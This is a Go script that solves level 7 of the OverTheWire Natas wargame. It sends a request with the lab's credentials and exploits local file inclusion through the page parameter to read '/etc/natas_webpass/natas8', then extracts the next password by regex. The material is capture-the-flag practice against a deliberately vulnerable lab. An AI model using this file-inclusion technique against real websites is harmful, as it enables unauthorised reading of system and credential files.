package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	// "net/url"
	"regexp"
	"strings"
)

var (
	username = "natas7"
	password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"
	urls = fmt.Sprintf("http://%s.natas.labs.overthewire.org",username) 
)

func main (){
	request, _ := http.NewRequest("GET", urls + "/index.php?page=/etc/natas_webpass/natas8", nil)
	// data := url.Values{}
	// data.Set("secret", "FOEIUWGHFEEUHOFUOIU")
	// data.Set("submit", "submit")
	// request, _ := http.NewRequest("POST", urls, strings.NewReader(data.Encode()))
	request.SetBasicAuth(username, password)
	// request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	response, _ := http.DefaultClient.Do(request)
	defer response.Body.Close()

	content ,_ := ioutil.ReadAll(response.Body)
	// fmt.Println(string(content))
	regex := regexp.MustCompile(`<br>\n(.*)\n\n`)
	almost := strings.Split(regex.FindAllString(string(content), 1)[0], "\n")
	answer := almost[1]
	fmt.Println(answer)
}
